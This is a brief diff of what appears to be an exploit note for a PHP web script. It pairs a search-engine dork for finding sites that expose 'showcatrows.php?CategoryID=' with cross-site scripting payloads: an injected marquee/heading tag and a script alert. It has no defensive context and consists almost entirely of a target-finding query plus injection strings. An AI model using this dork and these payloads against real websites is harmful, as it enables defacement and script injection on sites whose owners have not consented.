@@ -2,7 +2,9 @@
 
 inurl:"/showcatrows.php?CategoryID="
 
-exploit : "><marquee><h1>Your text</h1></mmarque>
+exploit : 
+
+"><marquee><h1>Your text</h1></mmarque>
 
 <script>alert("XSS")</script>
 
